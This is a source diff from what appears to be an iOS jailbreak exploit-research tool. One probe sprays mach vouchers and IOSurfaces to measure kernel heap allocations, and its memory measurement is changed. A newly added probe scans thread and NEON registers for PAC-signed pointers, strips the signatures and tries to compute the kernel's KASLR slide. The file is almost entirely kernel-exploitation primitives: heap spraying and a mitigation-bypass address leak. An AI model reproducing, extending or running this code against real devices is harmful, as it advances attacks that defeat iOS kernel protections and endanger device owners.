@@ -25328,42 +25328,16 @@ void iosurface_zone_voucher_spray(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnul
         int portDelta = 0;
 
         if (!isr_stopped()) {
-            log(@"[JB14] --- Paso 1: Baseline task_vm_info ---");
-            typedef struct {
-                uint64_t virtual_size;
-                uint64_t resident_size;
-                uint64_t resident_size_peak;
-                uint64_t device;
-                uint64_t device_peak;
-                uint64_t internal;
-                uint64_t internal_peak;
-                uint64_t external;
-                uint64_t external_peak;
-                uint64_t reusable;
-                uint64_t reusable_peak;
-                uint64_t purgeable_volatile_pmap;
-                uint64_t purgeable_volatile_resident;
-                uint64_t purgeable_volatile_virtual;
-                uint64_t compressed;
-                uint64_t compressed_peak;
-                uint64_t compressed_lifetime;
-                uint64_t phys_footprint;
-                uint64_t min_address;
-                uint64_t max_address;
-                int64_t ledger_phys_footprint_peak;
-            } jb14_vm_info_t;
+            log(@"[JB14] --- Paso 1: Baseline memory ---");
+            struct mach_task_basic_info mtbiPre;
+            mach_msg_type_number_t mtbiCnt = MACH_TASK_BASIC_INFO_COUNT;
+            kern_return_t kr = task_info(mach_task_self(), MACH_TASK_BASIC_INFO, (task_info_t)&mtbiPre, &mtbiCnt);
+            log([NSString stringWithFormat:@"[JB14] Baseline: resident=%llu virtual=%llu suspend=%d (kr=%d)",
+                 (unsigned long long)mtbiPre.resident_size, (unsigned long long)mtbiPre.virtual_size,
+                 mtbiPre.suspend_count, kr]);
 
-            jb14_vm_info_t vmPre;
-            memset(&vmPre, 0, sizeof(vmPre));
-            mach_msg_type_number_t vmCnt = sizeof(jb14_vm_info_t) / sizeof(natural_t);
-            kern_return_t kr = task_info(mach_task_self(), 22, (task_info_t)&vmPre, &vmCnt);
-            log([NSString stringWithFormat:@"[JB14] Baseline: phys_footprint=%llu internal=%llu compressed=%llu resident=%llu (kr=%d)",
-                 (unsigned long long)vmPre.phys_footprint, (unsigned long long)vmPre.internal,
-                 (unsigned long long)vmPre.compressed, (unsigned long long)vmPre.resident_size, kr]);
-
-            struct task_basic_info_64 tbiPre;
-            mach_msg_type_number_t tbiCnt = TASK_BASIC_INFO_64_COUNT;
-            task_info(mach_task_self(), TASK_BASIC_INFO_64, (task_info_t)&tbiPre, &tbiCnt);
+            uint64_t baseResident = mtbiPre.resident_size;
+            uint64_t baseVirtual = mtbiPre.virtual_size;
 
             if (!isr_stopped()) {
                 log(@"[JB14] --- Paso 2: Spray 512 mach_vouchers ---");
@@ -25379,8 +25353,8 @@ void iosurface_zone_voucher_spray(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnul
                         uint32_t previous_voucher;
                         uint32_t content_size;
                     } recipe;
-                    recipe.key = 8;
-                    recipe.command = 2;
+                    recipe.key = 7;
+                    recipe.command = 1;
                     recipe.previous_voucher = 0;
                     recipe.content_size = 0;
 
@@ -25397,15 +25371,14 @@ void iosurface_zone_voucher_spray(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnul
                     log([NSString stringWithFormat:@"[JB14] Sprayed %d vouchers", voucherCount]);
 
                     if (voucherCount > 0 && !isr_stopped()) {
-                        jb14_vm_info_t vmPost1;
-                        memset(&vmPost1, 0, sizeof(vmPost1));
-                        vmCnt = sizeof(jb14_vm_info_t) / sizeof(natural_t);
-                        task_info(mach_task_self(), 22, (task_info_t)&vmPost1, &vmCnt);
-                        voucherDeltaBytes = (int64_t)vmPost1.phys_footprint - (int64_t)vmPre.phys_footprint;
+                        struct mach_task_basic_info mtbiPost1;
+                        mach_msg_type_number_t cnt1 = MACH_TASK_BASIC_INFO_COUNT;
+                        task_info(mach_task_self(), MACH_TASK_BASIC_INFO, (task_info_t)&mtbiPost1, &cnt1);
+                        voucherDeltaBytes = (int64_t)mtbiPost1.resident_size - (int64_t)baseResident;
+                        int64_t vDeltaVirt = (int64_t)mtbiPost1.virtual_size - (int64_t)baseVirtual;
                         portDelta = voucherCount;
-                        log([NSString stringWithFormat:@"[JB14] Post-voucher: phys_footprint=%llu delta=%+lld internal_delta=%+lld",
-                             (unsigned long long)vmPost1.phys_footprint, (long long)voucherDeltaBytes,
-                             (long long)((int64_t)vmPost1.internal - (int64_t)vmPre.internal)]);
+                        log([NSString stringWithFormat:@"[JB14] Post-voucher: resident=%llu resDelta=%+lld virtDelta=%+lld",
+                             (unsigned long long)mtbiPost1.resident_size, (long long)voucherDeltaBytes, (long long)vDeltaVirt]);
                         if (voucherCount > 0) {
                             int64_t perVoucher = voucherDeltaBytes / voucherCount;
                             log([NSString stringWithFormat:@"[JB14] Estimated per-voucher kernel alloc: %lld bytes", (long long)perVoucher]);
@@ -25444,14 +25417,13 @@ void iosurface_zone_voucher_spray(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnul
                             log([NSString stringWithFormat:@"[JB14] Created %d IOSurfaces with properties", surfaceCount]);
 
                             if (surfaceCount > 0 && !isr_stopped()) {
-                                jb14_vm_info_t vmPost2;
-                                memset(&vmPost2, 0, sizeof(vmPost2));
-                                vmCnt = sizeof(jb14_vm_info_t) / sizeof(natural_t);
-                                task_info(mach_task_self(), 22, (task_info_t)&vmPost2, &vmCnt);
-                                int64_t totalDelta = (int64_t)vmPost2.phys_footprint - (int64_t)vmPre.phys_footprint;
+                                struct mach_task_basic_info mtbiPost2;
+                                mach_msg_type_number_t cnt2 = MACH_TASK_BASIC_INFO_COUNT;
+                                task_info(mach_task_self(), MACH_TASK_BASIC_INFO, (task_info_t)&mtbiPost2, &cnt2);
+                                int64_t totalDelta = (int64_t)mtbiPost2.resident_size - (int64_t)baseResident;
                                 surfaceDeltaBytes = totalDelta - voucherDeltaBytes;
-                                log([NSString stringWithFormat:@"[JB14] Post-surface: phys=%llu totalDelta=%+lld surfaceDelta=%+lld",
-                                     (unsigned long long)vmPost2.phys_footprint, (long long)totalDelta, (long long)surfaceDeltaBytes]);
+                                log([NSString stringWithFormat:@"[JB14] Post-surface: resident=%llu totalDelta=%+lld surfaceDelta=%+lld",
+                                     (unsigned long long)mtbiPost2.resident_size, (long long)totalDelta, (long long)surfaceDeltaBytes]);
                                 if (surfaceCount > 0) {
                                     int64_t perSurface = surfaceDeltaBytes / surfaceCount;
                                     log([NSString stringWithFormat:@"[JB14] Estimated per-surface kernel alloc: %lld bytes", (long long)perSurface]);
@@ -25486,13 +25458,12 @@ void iosurface_zone_voucher_spray(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnul
                     }
                     usleep(50000);
 
-                    jb14_vm_info_t vmPost3;
-                    memset(&vmPost3, 0, sizeof(vmPost3));
-                    vmCnt = sizeof(jb14_vm_info_t) / sizeof(natural_t);
-                    task_info(mach_task_self(), 22, (task_info_t)&vmPost3, &vmCnt);
-                    gcDeltaBytes = (int64_t)vmPost3.phys_footprint - (int64_t)vmPre.phys_footprint;
-                    log([NSString stringWithFormat:@"[JB14] Post-GC: phys=%llu deltaFromBase=%+lld recovered=%+lld",
-                         (unsigned long long)vmPost3.phys_footprint, (long long)gcDeltaBytes,
+                    struct mach_task_basic_info mtbiPost3;
+                    mach_msg_type_number_t cnt3 = MACH_TASK_BASIC_INFO_COUNT;
+                    task_info(mach_task_self(), MACH_TASK_BASIC_INFO, (task_info_t)&mtbiPost3, &cnt3);
+                    gcDeltaBytes = (int64_t)mtbiPost3.resident_size - (int64_t)baseResident;
+                    log([NSString stringWithFormat:@"[JB14] Post-GC: resident=%llu deltaFromBase=%+lld recovered=%+lld",
+                         (unsigned long long)mtbiPost3.resident_size, (long long)gcDeltaBytes,
                          (long long)(voucherDeltaBytes + surfaceDeltaBytes - gcDeltaBytes)]);
                 } else if (vouchers) {
                     for (int i = 0; i < voucherCount; i++) {
@@ -25757,6 +25728,210 @@ void iosurface_thread_port_leak(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull 
             @"kernelHeapPtrs": @(kernHeapPtrs),
             @"kernelObjPtrs": @(kernObjPtrs),
             @"totalPorts": @(totalPorts),
+            @"bestKernelPtr": [NSString stringWithFormat:@"0x%llx", (unsigned long long)bestKernPtr],
+            @"kaslrSlide": [NSString stringWithFormat:@"0x%llx", (unsigned long long)kaslrSlide]
+        });
+    });
+}
+
+#pragma mark - Probe JB16: PAC Pointer Harvest + Kernel Address Map
+
+static volatile int g_jb16_running = 1;
+
+static void *jb16_mach_worker(void *arg) {
+    (void)arg;
+    while (g_jb16_running) {
+        (void)mach_thread_self();
+        (void)mach_task_self();
+        (void)mach_host_self();
+        thread_switch(MACH_PORT_NULL, SWITCH_OPTION_DEPRESS, 1);
+        sched_yield();
+        mach_absolute_time();
+        mach_port_t p = MACH_PORT_NULL;
+        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &p);
+        if (p != MACH_PORT_NULL) mach_port_deallocate(mach_task_self(), p);
+    }
+    return NULL;
+}
+
+static void *jb16_io_worker(void *arg) {
+    (void)arg;
+    while (g_jb16_running) {
+        int fd = open("/dev/null", O_RDONLY);
+        if (fd >= 0) close(fd);
+        int pfd[2];
+        if (pipe(pfd) == 0) { close(pfd[0]); close(pfd[1]); }
+        sched_yield();
+    }
+    return NULL;
+}
+
+void iosurface_pac_harvest(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done) {
+    atomic_store(&g_isr_stop, false);
+    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
+        log(@"[JB16] ========================================");
+        log(@"[JB16] PAC Pointer Harvest + Kernel Address Map");
+        log(@"[JB16] Mass thread scan + diverse syscalls + PAC strip");
+        log(@"[JB16] ========================================");
+
+        int totalPacPtrs = 0;
+        int uniqueKernPtrs = 0;
+        int totalScans = 0;
+        uint64_t bestKernPtr = 0;
+        uint64_t kaslrSlide = 0;
+
+        uint64_t *uniquePtrs = (uint64_t *)calloc(4096, sizeof(uint64_t));
+        int uniqueCount = 0;
+
+        if (!isr_stopped()) {
+            log(@"[JB16] --- Paso 1: Spawn 16 diverse worker threads ---");
+            g_jb16_running = 1;
+            pthread_t workers[16];
+            for (int i = 0; i < 16; i++) {
+                if (i < 10)
+                    pthread_create(&workers[i], NULL, jb16_mach_worker, NULL);
+                else
+                    pthread_create(&workers[i], NULL, jb16_io_worker, NULL);
+            }
+
+            for (int scan = 0; scan < 10 && !isr_stopped(); scan++) {
+                usleep(30000);
+
+                thread_act_array_t threads = NULL;
+                mach_msg_type_number_t threadCount = 0;
+                kern_return_t kr = task_threads(mach_task_self(), &threads, &threadCount);
+                if (kr != KERN_SUCCESS || !threads) continue;
+
+                log([NSString stringWithFormat:@"[JB16] Scan %d: %u threads", scan, threadCount]);
+
+                for (uint32_t t = 0; t < threadCount && !isr_stopped(); t++) {
+                    arm_thread_state64_t state;
+                    mach_msg_type_number_t cnt = ARM_THREAD_STATE64_COUNT;
+                    kr = thread_get_state(threads[t], ARM_THREAD_STATE64, (thread_state_t)&state, &cnt);
+                    if (kr != KERN_SUCCESS) {
+                        mach_port_deallocate(mach_task_self(), threads[t]);
+                        continue;
+                    }
+                    totalScans++;
+
+                    uint64_t *regs = (uint64_t *)calloc(33, sizeof(uint64_t));
+                    if (!regs) { mach_port_deallocate(mach_task_self(), threads[t]); continue; }
+                    for (int r = 0; r < 29; r++) regs[r] = state.__x[r];
+                    regs[29] = (uint64_t)state.__fp;
+                    regs[30] = (uint64_t)state.__lr;
+                    regs[31] = (uint64_t)state.__sp;
+                    regs[32] = (uint64_t)state.__pc;
+
+                    for (int r = 0; r < 33; r++) {
+                        uint64_t v = regs[r];
+                        if (v == 0 || v == 0xFFFFFFFFFFFFFFFFULL) continue;
+
+                        uint64_t topWord = (v >> 48) & 0xFFFF;
+                        if (topWord == 0 || topWord == 0x0001 || topWord == 0xFFFF) continue;
+
+                        totalPacPtrs++;
+
+                        uint64_t stripped = v;
+                        if ((v >> 47) & 1) {
+                            stripped = v | 0xFFFF000000000000ULL;
+                        } else {
+                            stripped = v & 0x0000FFFFFFFFFFFFULL;
+                        }
+
+                        BOOL isKern = (stripped & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL;
+                        BOOL isKernObj = (stripped >= 0xFFFFFFF000000000ULL && stripped != 0xFFFFFFFFFFFFFFFFULL);
+
+                        if (isKernObj && uniquePtrs && uniqueCount < 4096) {
+                            BOOL dup = NO;
+                            for (int u = 0; u < uniqueCount; u++) {
+                                if (uniquePtrs[u] == stripped) { dup = YES; break; }
+                            }
+                            if (!dup) {
+                                uniquePtrs[uniqueCount++] = stripped;
+                                uniqueKernPtrs++;
+                                const char *kind = "HEAP";
+                                if (stripped < 0xFFFFFFF800000000ULL) kind = "TEXT";
+                                log([NSString stringWithFormat:@"[JB16] KERN_%s scan%d t[%u] r[%d] raw=0x%llx PAC=0x%04llx -> 0x%llx",
+                                     kind, scan, t, r, (unsigned long long)v, (unsigned long long)topWord, (unsigned long long)stripped]);
+                                if (bestKernPtr == 0 || stripped < bestKernPtr) bestKernPtr = stripped;
+                            }
+                        }
+
+                        if (isKern && totalPacPtrs <= 30 && !isKernObj) {
+                            log([NSString stringWithFormat:@"[JB16] PAC scan%d t[%u] r[%d] raw=0x%llx top=0x%04llx stripped=0x%llx",
+                                 scan, t, r, (unsigned long long)v, (unsigned long long)topWord, (unsigned long long)stripped]);
+                        }
+                    }
+
+                    arm_neon_state64_t neon;
+                    mach_msg_type_number_t neonCnt = ARM_NEON_STATE64_COUNT;
+                    kr = thread_get_state(threads[t], ARM_NEON_STATE64, (thread_state_t)&neon, &neonCnt);
+                    if (kr == KERN_SUCCESS) {
+                        for (int q = 0; q < 32; q++) {
+                            uint64_t lo = neon.__v[q] & 0xFFFFFFFFFFFFFFFFULL;
+                            uint64_t hi = (neon.__v[q] >> 64) & 0xFFFFFFFFFFFFFFFFULL;
+                            for (int half = 0; half < 2; half++) {
+                                uint64_t val = half == 0 ? lo : hi;
+                                if (val == 0 || val == 0xFFFFFFFFFFFFFFFFULL) continue;
+                                uint64_t stripped2 = val;
+                                if ((val >> 47) & 1) stripped2 = val | 0xFFFF000000000000ULL;
+                                else stripped2 = val & 0x0000FFFFFFFFFFFFULL;
+                                if (stripped2 >= 0xFFFFFFF000000000ULL && stripped2 != 0xFFFFFFFFFFFFFFFFULL) {
+                                    if (uniquePtrs && uniqueCount < 4096) {
+                                        BOOL dup = NO;
+                                        for (int u = 0; u < uniqueCount; u++) {
+                                            if (uniquePtrs[u] == stripped2) { dup = YES; break; }
+                                        }
+                                        if (!dup) {
+                                            uniquePtrs[uniqueCount++] = stripped2;
+                                            uniqueKernPtrs++;
+                                            log([NSString stringWithFormat:@"[JB16] NEON_KERN scan%d t[%u] q%d.%s raw=0x%llx -> 0x%llx",
+                                                 scan, t, q, half == 0 ? "lo" : "hi", (unsigned long long)val, (unsigned long long)stripped2]);
+                                            if (bestKernPtr == 0 || stripped2 < bestKernPtr) bestKernPtr = stripped2;
+                                        }
+                                    }
+                                }
+                            }
+                        }
+                    }
+
+                    free(regs);
+                    mach_port_deallocate(mach_task_self(), threads[t]);
+                }
+                vm_deallocate(mach_task_self(), (vm_address_t)threads, threadCount * sizeof(thread_act_t));
+            }
+
+            g_jb16_running = 0;
+            usleep(20000);
+            for (int i = 0; i < 16; i++) pthread_join(workers[i], NULL);
+        }
+
+        if (!isr_stopped()) {
+            log(@"[JB16] --- Summary of unique kernel addresses ---");
+            if (uniquePtrs) {
+                for (int i = 0; i < uniqueCount && i < 50; i++) {
+                    const char *kind = uniquePtrs[i] < 0xFFFFFFF800000000ULL ? "TEXT" : "HEAP/OBJ";
+                    log([NSString stringWithFormat:@"[JB16] UNIQUE[%d] 0x%llx (%s)", i, (unsigned long long)uniquePtrs[i], kind]);
+                }
+            }
+        }
+
+        if (bestKernPtr != 0 && bestKernPtr >= 0xFFFFFFF000000000ULL && bestKernPtr < 0xFFFFFFF800000000ULL) {
+            kaslrSlide = bestKernPtr - 0xFFFFFFF007004000ULL;
+            log([NSString stringWithFormat:@"[JB16] POSSIBLE KASLR SLIDE: 0x%llx", (unsigned long long)kaslrSlide]);
+        }
+
+        if (uniquePtrs) free(uniquePtrs);
+
+        log(@"[JB16] ========================================");
+        log([NSString stringWithFormat:@"[JB16] RESULTADO: scans=%d totalPAC=%d uniqueKern=%d bestPtr=0x%llx slide=0x%llx",
+             totalScans, totalPacPtrs, uniqueKernPtrs, (unsigned long long)bestKernPtr, (unsigned long long)kaslrSlide]);
+        log(@"[JB16] ========================================");
+
+        done(@{
+            @"totalScans": @(totalScans),
+            @"totalPacPointers": @(totalPacPtrs),
+            @"uniqueKernelPtrs": @(uniqueKernPtrs),
             @"bestKernelPtr": [NSString stringWithFormat:@"0x%llx", (unsigned long long)bestKernPtr],
             @"kaslrSlide": [NSString stringWithFormat:@"0x%llx", (unsigned long long)kaslrSlide]
         });
